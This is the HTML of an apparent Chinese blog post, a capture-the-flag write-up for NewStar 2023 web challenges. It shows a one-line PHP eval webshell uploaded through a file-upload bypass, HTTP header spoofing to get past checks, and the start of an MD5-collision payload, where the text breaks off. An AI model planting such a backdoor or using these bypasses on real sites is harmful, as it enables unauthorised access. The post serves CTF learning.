@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="NewStar WriteUpweb泄露的秘密 看到题目 首先想到 信息泄露相关的知识点：想到 phpinfo.php test.php ….  ​			最后到robots.txt 得到一半flag：  PART ONE: flag&amp;#123;r0bots_1s_s0_us3ful www.zip:   $PART_TWO &#x3D; &quot;_4nd_www.zip_1s_s0_d4ng3rous&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewStar 2023">
+<meta property="og:url" content="https://iahzl.github.io/NewStar-2023/index.html">
+<meta property="og:site_name" content="iah&#39;s blog">
+<meta property="og:description" content="NewStar WriteUpweb泄露的秘密 看到题目 首先想到 信息泄露相关的知识点：想到 phpinfo.php test.php ….  ​			最后到robots.txt 得到一半flag：  PART ONE: flag&amp;#123;r0bots_1s_s0_us3ful www.zip:   $PART_TWO &#x3D; &quot;_4nd_www.zip_1s_s0_d4ng3rous&amp;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925142322020.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925142512313.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925154247859.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925152823289.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925152958967.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925153150350.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214243591.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214220089.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214419173.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095210963.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095403902.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095521717.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095636943.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095957929.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100128656.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100330339.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100426655.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100815968.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926124224070.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926124757524.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125029145.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125148090.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125720157.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125430120.png">
+<meta property="og:image" content="d:\University\study\markdown\image-20230926205925939.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926211145829.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926211050969.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144213246.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144342795.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144031722.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230927095332177.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230927095404116.png">
+<meta property="article:published_time" content="2023-10-07T02:48:35.000Z">
+<meta property="article:modified_time" content="2023-10-07T02:53:35.725Z">
+<meta property="article:author" content="iahzl">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="crypto">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925142322020.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NewStar 2023</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=pjwW3MzIwiIEl1lYN-ZEbHa4nwnoXvXY4O3b-Awgio"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'pjwW3MzIwiIEl1lYN-ZEbHa4nwnoXvXY4O3b-Awgio');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="iah's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/%E5%9F%BA%E4%BA%8EFlask-websocket%E5%AE%9E%E7%8E%B0%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://iahzl.github.io/NewStar-2023/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://iahzl.github.io/NewStar-2023/&text=NewStar 2023"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://iahzl.github.io/NewStar-2023/&title=NewStar 2023"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://iahzl.github.io/NewStar-2023/&is_video=false&description=NewStar 2023"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NewStar 2023&body=Check out this article: https://iahzl.github.io/NewStar-2023/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://iahzl.github.io/NewStar-2023/&title=NewStar 2023"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://iahzl.github.io/NewStar-2023/&title=NewStar 2023"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://iahzl.github.io/NewStar-2023/&title=NewStar 2023"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://iahzl.github.io/NewStar-2023/&title=NewStar 2023"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://iahzl.github.io/NewStar-2023/&name=NewStar 2023&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://iahzl.github.io/NewStar-2023/&t=NewStar 2023"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStar-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">NewStar WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">泄露的秘密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Begin-of-Upload"><span class="toc-number">1.1.2.</span> <span class="toc-text">Begin of Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ErrorFlask"><span class="toc-number">1.1.3.</span> <span class="toc-text">ErrorFlask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Begin-of-HTTP"><span class="toc-number">1.1.4.</span> <span class="toc-text">Begin of HTTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Begin-of-PHP"><span class="toc-number">1.1.5.</span> <span class="toc-text">Begin of PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R-C-E"><span class="toc-number">1.1.6.</span> <span class="toc-text">R!C!E!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">1.2.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#brainfuck"><span class="toc-number">1.2.1.</span> <span class="toc-text">brainfuck</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Caesar%E2%80%99s-Secert"><span class="toc-number">1.2.2.</span> <span class="toc-text">Caesar’s Secert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fence"><span class="toc-number">1.2.3.</span> <span class="toc-text">Fence</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyrsa"><span class="toc-number">1.2.4.</span> <span class="toc-text">babyrsa</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RSA%E7%AE%97%E6%B3%95"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">RSA算法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyencoding"><span class="toc-number">1.2.5.</span> <span class="toc-text">babyencoding</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UUencode"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">UUencode</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        NewStar 2023
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">iahzl</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-07T02:48:35.000Z" class="dt-published" itemprop="datePublished">2023-10-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/NewStar-2023/">NewStar 2023</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/crypto/" rel="tag">crypto</a>, <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="NewStar-WriteUp"><a href="#NewStar-WriteUp" class="headerlink" title="NewStar WriteUp"></a>NewStar WriteUp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="泄露的秘密"><a href="#泄露的秘密" class="headerlink" title="泄露的秘密"></a>泄露的秘密</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925142322020.png" alt="image-20230925142322020"></p>
+<p>看到题目 首先想到 信息泄露相关的知识点：想到 phpinfo.php test.php …. </p>
+<p>​			最后到<code>robots.txt</code> 得到一半flag：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925142512313.png" alt="image-20230925142512313"></p>
+<p><code>PART ONE: flag&#123;r0bots_1s_s0_us3ful</code></p>
+<p><code>www.zip:</code> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925154247859.png" alt="image-20230925154247859"></p>
+<p><code>$PART_TWO = &quot;_4nd_www.zip_1s_s0_d4ng3rous&#125;&quot;;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$PART_TWO</span> = <span class="string">&quot;_4nd_www.zip_1s_s0_d4ng3rous&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！&lt;/h1&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925152823289.png" alt="image-20230925152823289"></p>
+<p>典型的文件上传漏洞 简单的尝试一下：</p>
+<p>利用bp抓包 修改后缀以及添加一句话php后门代码：<code> &lt;?php @eval($_POST[&#39;111111&#39;]);?&gt;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925152958967.png" alt="image-20230925152958967"></p>
+<p>上传成功 利用蚁剑连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925153150350.png" alt="image-20230925153150350"></p>
+<p>发现flag<code>flag&#123;ba65aadc-84ca-4ece-9a14-fadf4362f3c3&#125;</code></p>
+<h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>打开靶机显示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214243591.png" alt="image-20230925214243591"></p>
+<p>先利用抓包 简单构造number1和number2：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214220089.png" alt="image-20230925214220089"></p>
+<p>不是ssti模版注入，想到是整型数字可以正常得出结果，假如是字符会得出什么：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214419173.png" alt="image-20230925214419173"></p>
+<p>页面500 搜索flag 得到<code>flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;</code></p>
+<h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><ol>
+<li><p>首先打开目标靶机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095210963.png" alt="image-20230926095210963"></p>
+</li>
+<li><p>发现可能首先涉及的是get方式传参数 <code>ctf</code>，利用抓包看看效果</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095403902.png" alt="image-20230926095403902"></p>
+</li>
+<li><p>页面给出提示 ，后续需要利用POST请求给<code>secret</code>传值，但是具体传什么还不知道，首先查看源代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095521717.png" alt="image-20230926095521717"></p>
+</li>
+<li><p>发现了小东西：<code>&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt;</code> 利用base64解密得到：<code>n3wst4rCTF2023g00000d</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095636943.png" alt="image-20230926095636943"></p>
+</li>
+<li><p>进行post传值<code>secret=n3wst4rCTF2023g00000d</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095957929.png" alt="image-20230926095957929"></p>
+</li>
+<li><p>成功传值后给出下一步提示：发现cookie中存在<code>power</code> 于是将power修改为<code>ctfer</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100128656.png" alt="image-20230926100128656"></p>
+</li>
+<li><p>下一步提示需要修改浏览器，即是修改UA  <code>User-Agent: NewStarCTF2023</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100330339.png" alt="image-20230926100330339"></p>
+</li>
+<li><p>继续跟着提示修改<code>Referer: newstarctf.com</code> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100426655.png" alt="image-20230926100426655"></p>
+</li>
+<li><p>本来以为结束了，既然还有，限制只允许本地用户，首先想到<code>X-Forwarded-For</code>，但是尝试了<code>X-Forwarded-For:127.0.0.1</code>没有任何效果，继续查阅相关http的资料发现 <code>x-real-ip</code>也能限制本地用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100815968.png" alt="image-20230926100815968"></p>
+</li>
+<li><p>得到flag：<code>flag&#123;17b2edf3-a19b-4e8f-8639-cb2c5edb7000&#125;</code></p>
+</li>
+</ol>
+<p>整个题的思路还是很简单，只需要跟着题目的提示来解决就行，主要是要了解http的相关知识。</p>
+<h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><ol>
+<li><p>首先打开靶机看到php代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 1=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$flag1</span> = True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$flag2</span> = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$flag3</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 4=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;</span><br><span class="line">            <span class="variable">$flag4</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>进行代码审计，发现大概思路是首先输入<code>key1</code>和<code>key2</code>满足两个输入的值不同但是md5值相同得到flag1 接着满足其他条件依次得到flag2，flag3，flag4，由flag5得到flag</p>
+</li>
+<li><p>首先找到<code>key1</code>和<code>key2</code>满足两个输入的值不同但是md5值相同</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key1= fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975%EA%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%DDa7%D0%40%C6i%97%10l%84%9D%BA%7FK%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhjj%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2AF%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0Cw%0E%A3%94%9B</span><br><span class="line"></span><br><span class="line">key2= 